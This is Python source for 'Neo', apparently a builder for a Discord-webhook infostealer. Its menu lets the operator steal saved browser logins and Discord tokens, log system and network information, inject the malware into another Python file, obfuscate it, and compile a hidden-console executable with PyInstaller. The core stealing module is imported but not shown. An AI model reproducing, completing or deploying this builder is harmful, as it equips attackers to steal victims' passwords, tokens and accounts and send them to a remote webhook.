from ui.colors import *
import os.path

import ctypes  # An included library with Python install.   
import tkinter as tk
import time
from tkinter import filedialog

# These are all the Libraries used by the Malware Code that will be imported to the Obfuscated/Newly Created Code/Executable
# These will be written to the created .py file before compiling (to avoid linker errors)
libraries = '''
import os, re, subprocess
from Crypto.Cipher import AES
from discord import Embed, SyncWebhook
from win32crypt import CryptUnprotectData
import base64, json, shutil, sqlite3
from pathlib import Path
from zipfile import ZipFile
import ctypes, uuid, time
import psutil, requests, wmi
from discord import Embed, File, SyncWebhook
from PIL import ImageGrab
from lib.cfg.js_config import __config__ as __config__
from lib.cfg.js_config import js_bot as js_bot
'''

class cTypes:
    MB_OK = 0x0
    MB_OKCXL = 0x01
    MB_YESNOCXL = 0x03
    MB_YESNO = 0x04
    MB_HELP = 0x4000
    ICON_EXCLAIM = 0x30
    ICON_INFO = 0x40
    ICON_STOP = 0x10

class neo:
    def compile():
        global vPath, vDesktop
        vPath = os.getcwd()
        vDesktop = os.path.join(os.path.join(os.path.expanduser('~')), 'Desktop') 
        #if webhook_customize == 'n' or webhook_customize == 'N':
        webhook_icon_url = "https://ae01.alicdn.com/kf/A4e4fc27528524fa3a382396ad8ce7f1af/Dakimakura-funda-de-almohada-corporal-orc-para-mujer-estampado-de-doble-cara-tama-o-real-Anime.png"
        webhook_username = "Neo Hook (femboy furry UwU)"

        with open(f'{vPath}\\lib\\cfg\\js_config.py', 'w') as f:
            f.write(f'''
class js_bot:
    js_avatar_url = "{webhook_icon_url}"
    js_webhook_name = "{webhook_username}"
    js_webhook = "{webhook_url}"

class __config__:
    __runonce__ = "{s1}"
    __browserHook__ = "{s2}"
    __injection__ = "{s3}"
    __sysHook__ = "{s4}"
    __hook__ = "{s3}"
''')
        try:
            os.remove('src.exe')
        except:
            pass
        try:
            os.remove('src.spec')
        except:
            pass

        try:
            os.remove('Obfuscated_src.exe')
        except:
            pass
        try:
            os.remove('Obfuscated_src.spec')
        except:
            pass

        try:
            os.remove('src.py')
        except:
            pass
        try:
            os.remove('Obfuscated_src.py')
        except:
            pass

        def original_build():
            with open(f'{vPath}\\lib\\src.py', 'r', encoding='utf-8') as pf:
                fData = pf.readlines()
            obfuscatedData = fData[0]
            fData[0] = f"{libraries}\n{obfuscatedData}"
            with open(f'{vPath}\\src.py', 'w', encoding='utf-8') as pf:
                pf.writelines(fData)
            os.system(f'pyinstaller --icon=icon.ico --noconsole --distpath {vPath} --onefile {vPath}\\src.py')
            result = ctypes.windll.user32.MessageBoxW(0, f"If no errors have occured file will be under\n( {vPath}\src.exe )", "", cTypes.MB_OK, cTypes.ICON_EXCLAIM)
        def encode_obfuscate():
            os.system(f'python {vPath}\\dll\\tool_obfuscation.py {vPath}\\lib\\src.py')
            with open(f'{vPath}\\Obfuscated_src.py', 'r') as pf:
                fData = pf.readlines()
            obfuscatedData = fData[0]
            fData[0] = f"{libraries}\n{obfuscatedData}"
            with open(f'{vPath}\\Obfuscated_src.py', 'w') as pf:
                pf.writelines(fData)
            os.system(f'pyinstaller --icon=icon.ico --noconsole --distpath {vPath} --onefile {vPath}\\Obfuscated_src.py')
            result = ctypes.windll.user32.MessageBoxW(0, f"If no errors have occured file will be under\n( {vPath}\src.exe )", "", cTypes.MB_OK, cTypes.ICON_EXCLAIM)

        if c1 == 'y' or c1 == 'Y':
            encode_obfuscate()
        else:
            original_build()
        
        try:
            os.remove('Obfuscated_src.py')
        except:
            pass

    def qv():
        global f1, filePath, webhook_url, webhook_username, webhook_icon_url, webhook_customize
        global s1, s2, s3, s4, c1
        global filePath
        print(purple("         [+] Can break when presented with Python Code that cannot be Compiled with PyInstaller."))
        f1=input(purple("       [>] Add malware to already existing Python Source? (Run Logger With Another .PY File) [Y/N] "))
        if f1 == "y" or f1 == "Y":
            print(purple("       [>] Enter Additional File Path (FULL PATH)"))
            root = tk.Tk()
            root.withdraw()
            filePath = filedialog.askopenfilename()
            check_file = os.path.isfile(filePath)
            if check_file == False:
                while True:
                    print(error("       [!] File Does Not Exist or Path is Incorrect"))
                    input()
            print(red(f"       [AVAT:] A import at the top of the code will be added as (import lib.src as NeoGrabber)"))
            print(red(f"       [PATH:] File Selected: {filePath}"))
        webhook_url=input(purple("       [>] Enter Webhook URL: ")); webhook_customize=input(purple("       [>] Customize Webhook USERNAME/ICON? [Y/N]"))
        if webhook_customize == "y" or webhook_customize == "Y":
            webhook_username = input(purple("       [>] Enter Webhook Username: ")); webhook_icon_url = input(purple("       [>] Enter Webhook Icon (URL): "))
        print(purple("       [NOTE:] This will only execute the malware once and never run again (program will still run, No logging.)"))
        print(purple("       [NOTE:] Tokens and Discord Changes (Username, Passwords, Emails, Nitro, Tokens) Are still permanently Logged"))
        s1=input(purple("       [>] Run Malware Code Once? [Y/N] "))
        s2=input(purple("       [>] Steal Saved Browser Logins? [Y/N] "))
        s3=input(purple("       [>] Steal Discord Information (Token/Login) [Y/N] "))
        s4=input(purple("       [>] Log System and Network Info? [Y/N] "))
        c1=input(purple("       [>] Obfuscate/Encrypt Executable? (May Break When Using External Files) [Y/N] "))
        affirm=input(purple("       [>] Begin Compile (CHECK FOR ANY ERRORS) [Y/N] "))
        if affirm == "y" or affirm == "Y":
            neo.compile()
        else:
            while True:
                print(error("       [!] Canceled Compilie, Will not continue."))
                input()
    def __init__():
        clear()
        print(water(ui.banner), end="")
        neo.qv()

if __name__=="__main__":
    neo.__init__()
